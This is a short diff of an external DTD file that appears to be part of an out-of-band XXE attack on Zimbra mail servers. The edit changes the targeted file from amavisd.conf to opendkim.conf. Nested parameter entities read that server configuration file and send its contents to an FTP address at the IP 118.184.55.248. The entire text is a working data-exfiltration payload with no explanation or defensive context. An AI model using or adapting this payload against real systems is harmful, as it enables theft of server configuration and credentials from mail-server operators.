@@ -1,4 +1,4 @@
-<!ENTITY % payload SYSTEM "file:///opt/zimbra/conf/amavisd.conf">
+<!ENTITY % payload SYSTEM "file:///opt/zimbra/conf/opendkim.conf">
 <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'ftp://118.184.55.248:110/%payload;'>">
 %int;
 %trick;
